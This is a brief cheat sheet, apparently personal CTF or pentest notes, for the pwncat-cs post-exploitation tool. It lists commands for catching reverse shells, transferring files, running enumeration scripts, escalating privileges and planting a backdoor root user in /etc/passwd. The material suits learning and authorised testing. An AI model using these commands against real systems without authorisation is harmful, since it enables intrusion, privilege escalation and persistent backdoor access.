# Installation

`pip3 install pwncat-cs`

# Commands
- `-l` - listen
- `-p` on port
- `pwncat-cs -lp <PORT>` - Set up a listener
- `help`  - To view other commands for pwncat.
- `back` - We can use this to exit our local shell and use the reverse shell we've gotten (CTRL + D)
- `download` - We can use this to download files from the reverse shell to our local machine...(You need to be on the local shell)
- `upload` - You can upload a file from your remote machine to the reverse shell.

## Auto Enumeration using pwncat...

- We can use `search enum*` to check out the possible enumeration scripts.
- We can then run the script using `run <SCRIPT_NAME>`

## SSH login

`pwncat-cs ssh://user@IP`

## Running commands on the local machine

`local <COMMAND>`

## View current directory 

`lpwd`
## Change current directory

`lcd`

## Priv Esc...

`escalate list` - To see present ways to priv esc.
`escalate run` - Run an exploit.

## Adding another user with super privs if you are root...

`run implant.passwd backdoor_user=<username> backdoor_pass=<passsword>` - Add user in /etc/passwd

